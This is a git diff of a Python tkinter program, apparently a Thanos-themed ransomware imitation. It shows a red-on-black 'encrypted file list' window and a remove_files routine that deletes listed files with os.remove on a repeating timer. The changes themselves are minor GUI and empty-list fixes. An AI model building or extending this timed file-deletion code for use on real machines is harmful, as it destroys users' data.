@@ -116,6 +116,11 @@ def startTimer(gui, path, ext=None):
             else:
                 continue
 
+    if len(antdd_filelist)==0:
+        print("파일이 존재하지 않습니다")
+        allRemovePrint(gui)
+        return
+
     # gui/ 삭제될 파일 리스트 출력
     # gui.l_filelist.config(text="[" + ",".join(remove_filelist) + "]")
     # 지운 파일 출력 #새창으로 띄우기
@@ -123,7 +128,8 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.title('암호화된 파일 리스트')
     gui.listWindow.geometry("800x400")
     gui.listWindow.configure(background="black")
-    gui.list = tkinter.Label(gui.listWindow, text="[" + ",".join(antdd_filelist) + "]", background="black", fg="red")
+    gui.list = tkinter.Label(gui.listWindow, text="[" + ",".join(antdd_filelist) + "]", background="black", fg="red",font='Helvetica 14 bold')
+    gui.listWindow.lift()
     gui.list.pack()
     ####
     print("[" + ",".join(antdd_filelist) + "]")
@@ -159,12 +165,6 @@ def allRemovePrint(gui):
 
 
 def remove_files(gui, remove_filelist, ext=None):
-
-    # remove_filelist 가 비어있는 경우
-    if len(remove_filelist)==0:
-        print("더 이상 삭제할 파일이 없습니다")
-        allRemovePrint(gui)
-
     gui.l_thanos.destroy()
     gui.l_thanos = thanos.AnimatedGIF(gui.window, "../ui/thanos1.gif")
     gui.l_thanos.pack()
@@ -188,6 +188,7 @@ def remove_files(gui, remove_filelist, ext=None):
     elif (len(remove_filelist) == 1):
         os.remove(remove_filelist[0])
         print("더 이상 삭제할 파일이 없습니다")
+        gui.listWindow.destroy()
         allRemovePrint(gui)
 
     # gui
@@ -196,6 +197,9 @@ def remove_files(gui, remove_filelist, ext=None):
     gui.l_thanos.pack_forget()
     gui.l_thanos = tkinter.Label(gui.window, image=gui.thanos)
     gui.l_thanos.pack()
+
+    # 창 띄운 거 닫음
+    gui.listWindow.destroy()
 
     # 다시 타이머함수 시작!
     startTimer(gui, os.getcwd())
